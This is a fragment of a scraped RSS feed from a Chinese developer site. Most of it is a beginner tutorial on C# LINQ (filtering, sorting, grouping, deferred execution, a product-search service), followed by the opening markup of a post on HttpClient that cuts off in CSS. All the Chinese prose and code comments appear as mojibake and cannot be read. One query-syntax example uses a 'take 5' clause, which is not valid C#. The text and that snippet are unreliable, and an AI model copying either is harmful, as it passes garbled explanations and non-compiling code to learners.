</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[C#ï¼Œä¸ºä»€ä¹ˆè¦ç”¨LINQï¼Ÿ]]></title>    <link>https://juejin.cn/post/7589838742552559635</link>    <guid>https://juejin.cn/post/7589838742552559635</guid>    <pubDate>2026-01-01T10:57:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589838742552559635" data-draft-id="7589838742552543251" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="C#ï¼Œä¸ºä»€ä¹ˆè¦ç”¨LINQï¼Ÿ"/> <meta itemprop="keywords" content="C#"/> <meta itemprop="datePublished" content="2026-01-01T10:57:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸ƒå®ä¸‰å”"/> <meta itemprop="url" content="https://juejin.cn/user/2508420375913500"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            C#ï¼Œä¸ºä»€ä¹ˆè¦ç”¨LINQï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2508420375913500/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸ƒå®ä¸‰å”
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T10:57:50.000Z" title="Thu Jan 01 2026 10:57:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æƒ³è±¡ä½ æœ‰ä¸€ä¸ªæ‚ä¹±çš„ä¹¦æ¶ï¼ˆæ•°æ®é›†åˆï¼‰</h2>
<p><strong>ä¸ä½¿ç”¨LINQçš„æƒ…å†µï¼ˆä¼ ç»Ÿæ–¹å¼ï¼‰ï¼š</strong></p>
<p>csharp</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// ä½ æœ‰ä¸€å †ä¹¦</span>
List&lt;Book&gt; bookshelf = <span class="hljs-built_in">GetBookshelf</span>();

<span class="hljs-comment">// ä½ æƒ³æ‰¾å‡ºæ‰€æœ‰è®¡ç®—æœºç±»çš„ä¹¦ï¼Œå¹¶æŒ‰ä¹¦åæ’åº</span>
List&lt;Book&gt; computerBooks = new List&lt;Book&gt;();

<span class="hljs-comment">// ä¼ ç»Ÿæ–¹å¼ï¼šåƒäººå·¥ç¿»æ‰¾æ¯æœ¬ä¹¦</span>
foreach (var book in bookshelf)
{
    if (book.Category == "è®¡ç®—æœº")  <span class="hljs-comment">// é€ä¸€æ£€æŸ¥</span>
    {
        computerBooks<span class="hljs-selector-class">.Add</span>(book);  <span class="hljs-comment">// æ‰‹åŠ¨æ”¶é›†</span>
    }
}

<span class="hljs-comment">// ç„¶åå†æ‰‹åŠ¨æ’åº</span>
computerBooks<span class="hljs-selector-class">.Sort</span>((a, b) =&gt; <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.Title</span><span class="hljs-selector-class">.CompareTo</span>(b.Title));
</code></pre>
<p><strong>ä½¿ç”¨LINQçš„æƒ…å†µï¼ˆæ™ºèƒ½åŠ©æ‰‹å¸®ä½ æ‰¾ä¹¦ï¼‰ï¼š</strong></p>
<p>csharp</p>
<pre><code class="hljs language-ini" lang="ini">// ä½¿ç”¨LINQï¼šåƒå‘Šè¯‰æ™ºèƒ½åŠ©æ‰‹ä½ çš„éœ€æ±‚
var <span class="hljs-attr">computerBooks</span> = bookshelf
    .Where(<span class="hljs-attr">book</span> =&gt; book.Category == <span class="hljs-string">"è®¡ç®—æœº"</span>)  // <span class="hljs-string">"åªè¦è®¡ç®—æœºç±»çš„"</span>
    .OrderBy(<span class="hljs-attr">book</span> =&gt; book.Title)                // <span class="hljs-string">"æŒ‰ä¹¦åæ’åº"</span>
    .ToList()<span class="hljs-comment">;                                  // "æ•´ç†å¥½ç»™æˆ‘"</span>
</code></pre>
<h2 data-id="heading-1">LINQçš„ä¸‰ç§è¡¨è¾¾æ–¹å¼</h2>
<h3 data-id="heading-2">1. æ–¹æ³•è¯­æ³•ï¼ˆæœ€å¸¸ç”¨ï¼‰ - åƒç”¨æ‰‹æœºAppç­›é€‰å¤–å–</h3>
<p>csharp</p>
<pre><code class="hljs language-ini" lang="ini">var <span class="hljs-attr">results</span> = bookshelf
    .Where(<span class="hljs-attr">b</span> =&gt; b.Price &lt; <span class="hljs-number">50</span>)      // ä»·æ ¼ä½äº<span class="hljs-number">50</span>å…ƒ
    .OrderByDescending(<span class="hljs-attr">b</span> =&gt; b.Rating) // æŒ‰è¯„åˆ†é™åº
    .Select(<span class="hljs-attr">b</span> =&gt; b.Title)          // åªè¦ä¹¦å
    .Take(5)<span class="hljs-comment">;                     // å–å‰5æœ¬</span>
</code></pre>
<h3 data-id="heading-3">2. æŸ¥è¯¢è¯­æ³• - åƒç”¨è‡ªç„¶è¯­è¨€æé—®</h3>
<p>csharp</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">var</span> results = <span class="hljs-keyword">from</span> book <span class="hljs-keyword">in</span> bookshelf
              <span class="hljs-keyword">where</span> book.Price &lt; <span class="hljs-number">50</span>
              <span class="hljs-keyword">orderby</span> book.Rating <span class="hljs-keyword">descending</span>
              <span class="hljs-keyword">select</span> book.Title
              take <span class="hljs-number">5</span>;
<span class="hljs-comment">// ç¿»è¯‘ï¼š"ä»ä¹¦æ¶é‡Œï¼Œæ‰¾ä»·æ ¼ä½äº50çš„ä¹¦ï¼ŒæŒ‰è¯„åˆ†å€’åºæ’ï¼Œåªè¦ä¹¦åï¼Œå–å‰5ä¸ª"</span>
</code></pre>
<h3 data-id="heading-4">3. SQLé£æ ¼ - åƒæ•°æ®åº“æŸ¥è¯¢</h3>
<p>csharp</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// LINQ to SQL / Entity Framework</span>
<span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">cheapBooks</span> = <span class="hljs-selector-tag">from</span> <span class="hljs-selector-tag">b</span> <span class="hljs-selector-tag">in</span> <span class="hljs-selector-tag">dbContext</span><span class="hljs-selector-class">.Books</span>
                 <span class="hljs-selector-tag">where</span> <span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.Price</span> &lt; <span class="hljs-number">30</span>
                 <span class="hljs-selector-tag">select</span> <span class="hljs-selector-tag">new</span> { <span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.Title</span>, <span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.Author</span> };
<span class="hljs-comment">// è¿™ä¸ªä¼šè¢«ç¿»è¯‘æˆSQLï¼šSELECT Title, Author FROM Books WHERE Price &lt; 30</span>
</code></pre>
<h2 data-id="heading-5">ç°å®ç”Ÿæ´»åœºæ™¯å¯¹æ¯”</h2>
<p><strong>åœºæ™¯ï¼šæ•´ç†å®¶åº­ç›¸å†Œ</strong></p>
<p>csharp</p>
<pre><code class="hljs language-ini" lang="ini">// ä½ æ‰‹æœºé‡Œæœ‰1000å¼ ç…§ç‰‡
List&lt;Photo&gt; <span class="hljs-attr">allPhotos</span> = GetPhotosFromPhone()<span class="hljs-comment">;</span>

// éœ€æ±‚1ï¼šæ‰¾å‡ºå»å¹´æ‹çš„æ‰€æœ‰æµ·æ»©ç…§ç‰‡ï¼ŒæŒ‰æ—¶é—´æ’åº
var <span class="hljs-attr">beachPhotos</span> = allPhotos
    .Where(<span class="hljs-attr">p</span> =&gt; p.Date.Year == <span class="hljs-number">2023</span>)
    .Where(<span class="hljs-attr">p</span> =&gt; p.Tags.Contains(<span class="hljs-string">"æµ·æ»©"</span>))
    .OrderBy(<span class="hljs-attr">p</span> =&gt; p.Date)<span class="hljs-comment">;</span>

// éœ€æ±‚2ï¼šç»Ÿè®¡æ¯ä¸ªæœˆæ‹äº†å¤šå°‘å¼ ç…§ç‰‡
var <span class="hljs-attr">monthlyStats</span> = allPhotos
    .GroupBy(<span class="hljs-attr">p</span> =&gt; p.Date.ToString(<span class="hljs-string">"yyyy-MM"</span>))
    .Select(<span class="hljs-attr">g</span> =&gt; new {
        <span class="hljs-attr">Month</span> = g.Key,
        <span class="hljs-attr">Count</span> = g.Count(),
        <span class="hljs-attr">AvgSize</span> = g.Average(p =&gt; p.FileSize)
    })<span class="hljs-comment">;</span>

// éœ€æ±‚3ï¼šæ‰¾å‡ºæ–‡ä»¶æœ€å¤§çš„10å¼ ç…§ç‰‡
var <span class="hljs-attr">largestPhotos</span> = allPhotos
    .OrderByDescending(<span class="hljs-attr">p</span> =&gt; p.FileSize)
    .Take(10)<span class="hljs-comment">;</span>
</code></pre>
<h2 data-id="heading-6">LINQçš„æ ¸å¿ƒä¼˜åŠ¿</h2>
<ol>
<li>
<p><strong>å£°æ˜å¼ç¼–ç¨‹</strong>ï¼šå‘Šè¯‰è®¡ç®—æœº"è¦ä»€ä¹ˆ"ï¼Œè€Œä¸æ˜¯"æ€ä¹ˆåš"</p>
<p>csharp</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// ä¼ ç»Ÿï¼šå¾ªç¯ã€åˆ¤æ–­ã€æ”¶é›†ï¼ˆå…³æ³¨è¿‡ç¨‹ï¼‰</span>
<span class="hljs-comment">// LINQï¼šæ¡ä»¶ã€æ’åºã€æŠ•å½±ï¼ˆå…³æ³¨ç»“æœï¼‰</span>
</code></pre>
</li>
<li>
<p><strong>å»¶è¿Ÿæ‰§è¡Œ</strong>ï¼šåƒå¤–å–ä¸‹å•ï¼Œä¸é©¬ä¸Šåš</p>
<p>csharp</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">var</span> query = books.Where(b =&gt; b.Price &gt; <span class="hljs-number">100</span>); <span class="hljs-comment">// åªæ˜¯"å®šä¹‰éœ€æ±‚"</span>

<span class="hljs-comment">// çœŸæ­£éœ€è¦æ•°æ®æ—¶æ‰æ‰§è¡Œï¼ˆåƒä¸‹å•åæ‰å¼€å§‹åšé¥­ï¼‰</span>
<span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">var</span> book <span class="hljs-keyword">in</span> query)  <span class="hljs-comment">// è¿™é‡Œæ‰æ‰§è¡ŒæŸ¥è¯¢</span>
{
    Console.WriteLine(book.Title);
}
</code></pre>
</li>
<li>
<p><strong>å¯ç»„åˆæ€§</strong>ï¼šåƒæ­ç§¯æœ¨</p>
<p>csharp</p>
<pre><code class="hljs language-ini" lang="ini">var <span class="hljs-attr">baseQuery</span> = books.AsQueryable()<span class="hljs-comment">;</span>

// æ ¹æ®ä¸åŒæ¡ä»¶ç»„åˆæŸ¥è¯¢
if (userWantsCheapBooks)
    <span class="hljs-attr">baseQuery</span> = baseQuery.Where(b =&gt; b.Price &lt; <span class="hljs-number">50</span>)<span class="hljs-comment">;</span>

if (userWantsByAuthor)
    <span class="hljs-attr">baseQuery</span> = baseQuery.Where(b =&gt; b.Author == <span class="hljs-string">"åˆ˜æ…ˆæ¬£"</span>)<span class="hljs-comment">;</span>
    
// æœ€åæ‰æ‰§è¡Œ
var <span class="hljs-attr">results</span> = baseQuery.ToList()<span class="hljs-comment">;</span>
</code></pre>
</li>
</ol>
<h2 data-id="heading-7">å¸¸è§çš„LINQæ“ä½œï¼ˆåƒå¨æˆ¿å·¥å…·ï¼‰</h2>
<p>csharp</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. è¿‡æ»¤ï¼ˆç­›å­ï¼‰ï¼šWhere</span>
books.<span class="hljs-title class_">Where</span>(<span class="hljs-function"><span class="hljs-params">b</span> =&gt;</span> b.<span class="hljs-property">Rating</span> &gt; <span class="hljs-number">4.0</span>)

<span class="hljs-comment">// 2. æ˜ å°„ï¼ˆæ¦¨æ±æœºï¼‰ï¼šSelect</span>
books.<span class="hljs-title class_">Select</span>(<span class="hljs-function"><span class="hljs-params">b</span> =&gt;</span> b.<span class="hljs-property">Title</span>)  <span class="hljs-comment">// åªè¦ä¹¦å</span>
books.<span class="hljs-title class_">Select</span>(<span class="hljs-function"><span class="hljs-params">b</span> =&gt;</span> <span class="hljs-keyword">new</span> { b.<span class="hljs-property">Title</span>, b.<span class="hljs-property">Price</span> }) <span class="hljs-comment">// æå–éƒ¨åˆ†ä¿¡æ¯</span>

<span class="hljs-comment">// 3. æ’åºï¼ˆæ•´ç†æ¶ï¼‰ï¼šOrderBy/ThenBy</span>
books.<span class="hljs-title class_">OrderBy</span>(<span class="hljs-function"><span class="hljs-params">b</span> =&gt;</span> b.<span class="hljs-property">Price</span>).<span class="hljs-title class_">ThenBy</span>(<span class="hljs-function"><span class="hljs-params">b</span> =&gt;</span> b.<span class="hljs-property">Title</span>)

<span class="hljs-comment">// 4. åˆ†ç»„ï¼ˆåˆ†ç±»ç›’ï¼‰ï¼šGroupBy</span>
books.<span class="hljs-title class_">GroupBy</span>(<span class="hljs-function"><span class="hljs-params">b</span> =&gt;</span> b.<span class="hljs-property">Category</span>)  <span class="hljs-comment">// æŒ‰ç±»åˆ«åˆ†ç»„</span>

<span class="hljs-comment">// 5. èšåˆï¼ˆè®¡ç®—å™¨ï¼‰</span>
books.<span class="hljs-title class_">Count</span>()                    <span class="hljs-comment">// æ€»æ•°</span>
books.<span class="hljs-title class_">Average</span>(<span class="hljs-function"><span class="hljs-params">b</span> =&gt;</span> b.<span class="hljs-property">Price</span>)      <span class="hljs-comment">// å¹³å‡ä»·æ ¼</span>
books.<span class="hljs-title class_">Sum</span>(<span class="hljs-function"><span class="hljs-params">b</span> =&gt;</span> b.<span class="hljs-property">Pages</span>)         <span class="hljs-comment">// æ€»é¡µæ•°</span>
books.<span class="hljs-title class_">Max</span>(<span class="hljs-function"><span class="hljs-params">b</span> =&gt;</span> b.<span class="hljs-property">Price</span>)         <span class="hljs-comment">// æœ€è´µçš„</span>

<span class="hljs-comment">// 6. è¿æ¥ï¼ˆæ‹¼å›¾ï¼‰ï¼šJoinï¼ˆåƒåˆå¹¶ä¸¤ä¸ªæ¸…å•ï¼‰</span>
<span class="hljs-keyword">var</span> bookOrders = books.<span class="hljs-title class_">Join</span>(orders,
    <span class="hljs-function"><span class="hljs-params">book</span> =&gt;</span> book.<span class="hljs-property">Id</span>,           <span class="hljs-comment">// ä¹¦çš„ID</span>
    <span class="hljs-function"><span class="hljs-params">order</span> =&gt;</span> order.<span class="hljs-property">BookId</span>,     <span class="hljs-comment">// è®¢å•ä¸­çš„ä¹¦ID</span>
    <span class="hljs-function">(<span class="hljs-params">book, order</span>) =&gt;</span> <span class="hljs-keyword">new</span> { book.<span class="hljs-property">Title</span>, order.<span class="hljs-property">Quantity</span> });
</code></pre>
<h2 data-id="heading-8">å®é™…ä»£ç ç¤ºä¾‹ï¼šç”µå•†å•†å“ç­›é€‰</h2>
<p>csharp</p>
<pre><code class="hljs language-ini" lang="ini">public class ProductService
{
    public List&lt;Product&gt; SearchProducts(
        decimal? <span class="hljs-attr">maxPrice</span> = null,
        string <span class="hljs-attr">category</span> = null,
        int <span class="hljs-attr">minRating</span> = <span class="hljs-number">0</span>,
        string <span class="hljs-attr">sortBy</span> = <span class="hljs-string">"price"</span>)
    {
        var <span class="hljs-attr">query</span> = _products.AsQueryable()<span class="hljs-comment">;</span>
        
        // åŠ¨æ€æ„å»ºæŸ¥è¯¢æ¡ä»¶
        if (maxPrice.HasValue)
            <span class="hljs-attr">query</span> = query.Where(p =&gt; p.Price &lt;= maxPrice.Value)<span class="hljs-comment">;</span>
        
        if (!string.IsNullOrEmpty(category))
            <span class="hljs-attr">query</span> = query.Where(p =&gt; p.Category == category)<span class="hljs-comment">;</span>
            
        if (minRating &gt; 0)
            <span class="hljs-attr">query</span> = query.Where(p =&gt; p.Rating &gt;= minRating)<span class="hljs-comment">;</span>
        
        // åŠ¨æ€æ’åº
        <span class="hljs-attr">query</span> = sortBy switch
        {
            <span class="hljs-attr">"price"</span> =&gt; query.OrderBy(p =&gt; p.Price),
            <span class="hljs-attr">"rating"</span> =&gt; query.OrderByDescending(p =&gt; p.Rating),
            <span class="hljs-attr">"sales"</span> =&gt; query.OrderByDescending(p =&gt; p.MonthlySales),
            <span class="hljs-attr">_</span> =&gt; query.OrderBy(p =&gt; p.Id)
        }<span class="hljs-comment">;</span>
        
        return query.ToList()<span class="hljs-comment">;  // ä¸€æ¬¡æ€§æ‰§è¡Œæ‰€æœ‰æ¡ä»¶</span>
    }
}
</code></pre>
<h2 data-id="heading-9">æ€»ç»“</h2>
<p><strong>LINQå°±åƒä½ çš„æ•°æ®ç®¡å®¶ï¼š</strong></p>
<ul>
<li>ä½ ä¸éœ€è¦äº²è‡ªç¿»ç®±å€’æŸœæ‰¾æ•°æ®</li>
<li>åªéœ€è¦å‘Šè¯‰å®ƒä½ çš„éœ€æ±‚ï¼ˆæ¡ä»¶ã€æ’åºã€åˆ†ç»„ï¼‰</li>
<li>å®ƒå¸®ä½ é«˜æ•ˆåœ°æ•´ç†ã€ç­›é€‰ã€è®¡ç®—</li>
<li>æ— è®ºæ˜¯å†…å­˜é›†åˆã€æ•°æ®åº“ã€XMLè¿˜æ˜¯å…¶ä»–æ•°æ®æºï¼Œç”¨æ³•éƒ½ä¸€è‡´</li>
</ul>
<p><strong>å…³é”®æ€æƒ³è½¬å˜ï¼š</strong><br/>
ä»"æˆ‘æ€ä¹ˆä¸€æ­¥æ­¥æ“ä½œæ•°æ®" â†’ åˆ°"æˆ‘æƒ³è¦ä»€ä¹ˆæ ·çš„æ•°æ®ç»“æœ"</p>
<p>è¿™å°±å¥½æ¯”ä»"è‡ªå·±å»ä»“åº“æ¬è´§ã€åˆ†ç±»ã€è´´æ ‡ç­¾"å˜æˆäº†"ç»™ä»“å‚¨æœºå™¨äººä¸€ä¸ªéœ€æ±‚æ¸…å•ï¼Œå®ƒå¸®ä½ æå®šä¸€åˆ‡"ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç”¨ã€Œç‚¹å¤–å–ã€çš„ä¾‹å­è®²é€HttpClient]]></title>    <link>https://juejin.cn/post/7589903499599577142</link>    <guid>https://juejin.cn/post/7589903499599577142</guid>    <pubDate>2026-01-01T11:23:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589903499599577142" data-draft-id="7589838742552592403" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç”¨ã€Œç‚¹å¤–å–ã€çš„ä¾‹å­è®²é€HttpClient"/> <meta itemprop="keywords" content="HTTP,C#"/> <meta itemprop="datePublished" content="2026-01-01T11:23:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸ƒå®ä¸‰å”"/> <meta itemprop="url" content="https://juejin.cn/user/2508420375913500"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç”¨ã€Œç‚¹å¤–å–ã€çš„ä¾‹å­è®²é€HttpClient
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2508420375913500/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸ƒå®ä¸‰å”
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T11:23:31.000Z" title="Thu Jan 01 2026 11:23:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body 